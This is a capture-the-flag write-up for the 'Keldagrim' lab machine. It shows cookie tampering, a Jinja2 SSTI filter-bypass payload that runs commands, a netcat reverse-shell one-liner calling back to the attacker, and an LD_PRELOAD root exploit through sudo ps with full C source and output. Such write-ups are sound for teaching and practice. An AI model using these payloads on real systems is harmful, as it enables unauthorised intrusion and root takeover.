##Keldagrim

#Enumeration
```
# Nmap 7.91 scan initiated Thu May  6 13:36:46 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80 10.10.203.185
Nmap scan report for 10.10.203.185
Host is up, received timestamp-reply ttl 61 (0.14s latency).
Scanned at 2021-05-06 13:36:47 PDT for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1ElGI0HLd8mhCV1HC0Mdnml4FZPMr17SrcABm6GMKV0g5e4wQNtSPAvXhGj696aoKgVX1jDbe4DzDGr3jDkLjXegnpqQyVQnSYV7Cz9pON4b9cplT/OPK/7cd96E7tKFsZ3F+eOM51Vm6KeYUbZG0DnHZIB7kmPAH+ongqQmpG8Of/wXNgR4ONc6dD/lTYWCgWeCEYT0ERlErkqM05mO9DwV+7Lr+AZhAZ8afx+NSpV17gBZzjmqT4my3zMAf3Ne0VY/exvb807YKiHmPPaieE8KxjfRjcsHGsMuYesDm3m0cUvGSdp2xfu8J5dOSNJc5cVse6RBTPmPu4giRtm+v
|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBETP4uMiwXXjEW/UWp1IE/XvhxASBN753PiuZmLz6QiSZE3y5sIHpMtXA3Sss4bZh4DR3hoP3OhXgJmjCJaSS4=
|   256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJVgfo2NhVXDfelQtZw0p6JWJLPk2/1NF3KRImlYIIul
80/tcp open  http    syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-cookie-flags:
|   /:
|     session:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title:  Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  6 13:36:59 2021 -- 1 IP address (1 host up) scanned in 12.68 seconds
```

Just ssh and a web server ports are open so lets check out the page.

#Web Server Port 80
A gold buying website for mmo's. We start by looking at the source code and pages before we try enumerating directories and subdomains with gobuster. We find a couple interesting things. Firstly a admin page that is grayed out from being selected but a link to is viewable in the source code at /admin. Going to it seems to simply put us on the home page, but maybe we have a session cookie we can manipulate to change this. We find a session cookie with the following value.
```
echo 'Z3Vlc3Q=' | base64 -d
guest
```
so lets convert admin to base64 and see if we see anything new. Sure enough admin is no longer grayed out and going to /admin gives us a page that says
```
Current user - $2,165
```

Seems pretty odd but its a static value in the source code, however we have a new cookie now called sales with the following value.
```
echo 'JDIsMTY1' | base64 -d
$2,165
```

Interesting lets test for XSS,
```
<script>alert('XSS')</script> -> base64-> PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

using this produce the following in the source code,
```
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

Looks like a filter on at least the following characters
```
<
>
'
```

I went ahead and tried to bypass this filter a few ways, but before I get too carried away here I want to look at the other thing I initially noticed.

there is a directory /static/images that has images stored for the page however when trying to load the directory itself something interesting occurs.
```

Error - Page Not Found

There has been an error when trying to view staticimages! Please return back to the site

```
The same occurs when trying to go to /static as well. So it seems like its the directories are restricted but it then tries to load it as a page as opposed to a directory and the / is being bypassed. So before we worry about the filter lets see if we have SSTI.

```
/${7*7}

There has been an error when trying to view ${7*7}! Please return back to the site

/{{7*7}}

There has been an error when trying to view 49! Please return back to the site

/{{7*'7'}}

There has been an error when trying to view 7777777! Please return back to the site
```

So we definitely have SSTI on likely a jinja2 or twig framework, but with some filters so lets switch over to burpsuite and use the following payload to try and bypass the filters
```
GET {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

There has been an error when trying to view uid=1000(jed) gid=1000(jed) groups=1000(jed)
```

Awesome, we have bypassed the filter and got the id command to execute so let's just take a normal reverse shell such as rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f, and then hex-encoded it with /x delimiters and try and replace the 'id' command with it. Sure enough we get a hit on our listener and we have a foothold

#Initial Foothold/Privilege Escalation
We get a shell as the jed user in their home directory and can find the user.txt flag here. Next we find the following,
```
jed@keldagrim:~$ sudo -l
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
```

ps doesn't have any entries on GTFObins however we can still run it as root with no password and in conjuction with LD_PRELOAD we can try the following privilege escalation method from 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ld_preload-and-nopasswd

we first verify that gcc is on the system and then make the following shell.c file
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

then execute the following
```
jed@keldagrim:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:2: warning: implicit declaration of function ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
  setgid(0);
  ^~~~~~
  setenv
shell.c:7:2: warning: implicit declaration of function ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
  setuid(0);
  ^~~~~~
  setenv
jed@keldagrim:~$ sudo LD_PRELOAD=/home/jed/shell.so ps
# cd /root
# ls -la
total 28
drwx------  4 root root 4096 Dec  4 22:22 .
drwxr-xr-x 24 root root 4096 Dec  4 19:38 ..
lrwxrwxrwx  1 root root    9 Dec  4 22:21 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Dec  4 22:09 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   38 Dec  4 22:15 root.txt
drwx------  2 root root 4096 Nov  9 00:57 .ssh
```

We successfully have root access and claim our root.txt flag! Thinking back we could have explored using the cookie to execute SSTI instead of XSS and likely would have been able to use a similar payload to extract information and establish a foothold.
